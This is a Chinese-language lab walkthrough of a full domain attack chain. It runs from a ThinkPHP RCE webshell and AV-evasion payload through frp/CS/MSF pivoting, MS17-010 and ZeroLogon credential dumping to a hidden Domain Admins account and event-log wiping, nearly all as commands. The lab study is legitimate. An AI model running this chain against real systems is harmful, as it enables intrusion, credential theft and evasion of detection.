## 环境搭建

    
    
    win7
    192.168.111.132（仅主机）
    192.168.123.212（桥接）
    .\heart p-0p-0p-0
    
    win2008 ip:
    192.168.111.131（仅主机）
    sun\admin 2020.com
    
    kali ip:
    192.168.10.131（nat）
    
    vps：
    101.42.**.**
    

> 用本地管理员heart登录并开启phpstudy
>
> 这里配置的原因是让kali可以访问win7，win7访问不了kali，模拟win7外网的环境和kali内网的环境

## getshell

    
    
    sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 512 --host-timeout 30 -T3 -v -oG result.txt --script http-methods --script-args http.useragent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"  10.133.10.135 -p 0-65535
    

> Discovered open port 110/tcp on 10.133.10.135  
> Discovered open port 139/tcp on 10.133.10.135  
> Discovered open port 3306/tcp on 10.133.10.135  
> Discovered open port 135/tcp on 10.133.10.135  
> Discovered open port 80/tcp on 10.133.10.135  
> Discovered open port 445/tcp on 10.133.10.135  
> Discovered open port 25/tcp on 10.133.10.135  
> Discovered open port 49152/tcp on 10.133.10.135  
> Discovered open port 49153/tcp on 10.133.10.135  
> Discovered open port 49154/tcp on 10.133.10.135

访问80页面发现一个thinkphp框架的首页，工具扫描RCE

![image-20230902185850477.png](https://image.3001.net/images/20230903/1693717269_64f41315bbeed005b62ee.png!small)

    
    
    一键getshell
    http://10.133.10.135/peiqi.php   Pass:peiqi
    

## 后渗透

将kali通过frp到vps端口，并生成免杀exe，蚁剑上传执行

    
    
    python 签名.py -i D:\Huorong\Sysdiag\bin\HipsMain.exe -t UUIDtoShell.exe -o qm.exe
    

上线cs，发现为heart用户，管理员权限，svc提权到system，抓取hash和明文，没有发现有用的域用户信息

    
    
    net view
    ipconfig /all
    

发现主机dc：192.168.111.131 ,以及内网网卡192.168.111.132

开启socks代理，通过fscan扫描内网111网段

    
    
    proxychains4  ./fscan -h 192.168.111.0/24
    

192.168.111.131 MS17-010

> 192.168.111.131:445 open  
> 192.168.111.131:135 open  
> 192.168.111.131:139 open  
> 192.168.111.131:88 open

存在永恒之蓝，将cs转到msf

    
    
    新建cs监听器，spawn msf/新建会话
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_http
    set lhost 127.0.0.1
    set lport 4566
    run
    

![image-20230903002336049.png](https://image.3001.net/images/20230903/1693717280_64f4132027c8710602862.png!small)

修改frp端口，增加4566为监听端口

    
    
    [cs->msf]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 4566
    remote_port = 4566
    

上线msf，开代理

    
    
    setg Proxies socks5:127.0.0.1:8899
    setg ReverseAllowProxy true
    

MS17-010

    
    
    use auxiliary/scanner/smb/smb_ms17_010
    set rhosts 192.168.111.131
    run
    
    use exploit/windows/smb/ms17_010_eternalblue
    set payload windows/x64/meterpreter/bind_tcp
    set rhosts 192.168.111.131
    run
    

失败了

### CVE-2020-1472-ZeroLogon

    
    
    mimikatz lsadump::zerologon /target:dc.sun.com /account:dc$
    mimikatz lsadump::zerologon /target:dc.sun.com /account:dc$ /exploit
    mimikatz lsadump::dcsync /domain:sun.com /dc:dc.sun.com /user:administrator /authuser:dc$ /authdomain:sun.com /authpassword:"" /authntlm
    mimikatz lsadump::postzerologon /target:sun.com /account:dc$
    #恢复密码，没有权限，可以先打到域控再复原
    
    
    
    sun.com\Administrator 9099d68602a60f007c227c4fa95fada6
    md5解密：p-0p-0p-0
    

这里dc不出网，fscan扫描到开启了445端口，直接smb上线

## 权限维持

    
    
    创建影子账户
    net user coleak$ p-0p-0p-0 /add
    net localgroup administrators coleak$ /add
    net group "Domain Admins" coleak$ /add /domain
    net users
    

## 痕迹清理

    
    
    wevtutil cl security	//清理安全日志
    wevtutil cl system		//清理系统日志
    wevtutil cl application		//清理应用程序日志
    wevtutil cl "windows powershell"	//清除power shell日志
    wevtutil cl Setup	
    

